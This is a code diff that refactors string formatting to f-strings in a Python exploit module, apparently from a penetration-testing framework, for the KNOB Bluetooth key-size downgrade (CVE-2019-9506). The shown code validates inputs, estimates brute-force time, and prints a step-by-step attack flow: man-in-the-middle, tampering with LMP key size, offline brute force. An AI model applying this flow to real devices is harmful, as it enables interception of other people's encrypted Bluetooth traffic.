@@ -96,11 +96,11 @@ class Exploit(Exploit):
             print_error("Endereço do alvo não definido")
             return False
         if _parse_bd_addr(str(self.target)) is None:
-            print_error("BD_ADDR inválido: {}".format(self.target))
+            print_error(f"BD_ADDR inválido: {self.target}")
             return False
         ks = int(self.target_key_size)
         if ks < 1 or ks > 16:
-            print_error("target_key_size deve ser 1-16, recebido: {}".format(ks))
+            print_error(f"target_key_size deve ser 1-16, recebido: {ks}")
             return False
         return True
 
@@ -112,8 +112,8 @@ class Exploit(Exploit):
     def run(self):
         """Gera sequência de ataque KNOB e análise de força bruta."""
         print_status("KNOB Attack (CVE-2019-9506) — entropy downgrade BT BR/EDR")
-        print_info("Alvo: {} | Interface: {}".format(self.target, self.interface))
-        print_info("Key size alvo: {} byte(s)".format(self.target_key_size))
+        print_info(f"Alvo: {self.target} | Interface: {self.interface}")
+        print_info(f"Key size alvo: {self.target_key_size} byte(s)")
 
         if not self._validate():
             return
@@ -138,23 +138,21 @@ class Exploit(Exploit):
         brute_force_space = 256 ** key_size
         brute_time_ns = brute_force_space / 1_000_000_000
         print_info("Análise de força bruta:")
-        print_info("  Espaço de chaves: {:,} possibilidades".format(brute_force_space))
-        print_info("  Tempo estimado (1 GHz): {:.4f} segundos".format(brute_time_ns))
+        print_info(f"  Espaço de chaves: {brute_force_space:,} possibilidades")
+        print_info(f"  Tempo estimado (1 GHz): {brute_time_ns:.4f} segundos")
 
         if key_size == 1:
             print_success("1 byte: trivialmente quebrável (256 tentativas)")
         elif key_size <= 4:
-            print_warning("{} bytes: quebrável em tempo razoável".format(key_size))
+            print_warning(f"{key_size} bytes: quebrável em tempo razoável")
         else:
-            print_info("{} bytes: chave fraca mas resistente".format(key_size))
+            print_info(f"{key_size} bytes: chave fraca mas resistente")
 
         print_info("")
         print_info("Fluxo de ataque real:")
-        print_info("  1. Posicionar adaptador '{}' em modo MitM entre os dois dispositivos".format(
-            self.interface))
+        print_info(f"  1. Posicionar adaptador '{self.interface}' em modo MitM entre os dois dispositivos")
         print_info("  2. Interceptar troca LMP durante pareamento/reconexão")
-        print_info("  3. Modificar LMP_encryption_key_size_req de {} para {} byte(s)".format(
-            _DEFAULT_KEY_SIZE, key_size))
+        print_info(f"  3. Modificar LMP_encryption_key_size_req de {_DEFAULT_KEY_SIZE} para {key_size} byte(s)")
         print_info("  4. Ambos aceitam chave mínima — criptografia comprometida")
         print_info("  5. Brute-force offline da chave de 1 byte")
         print_info("")
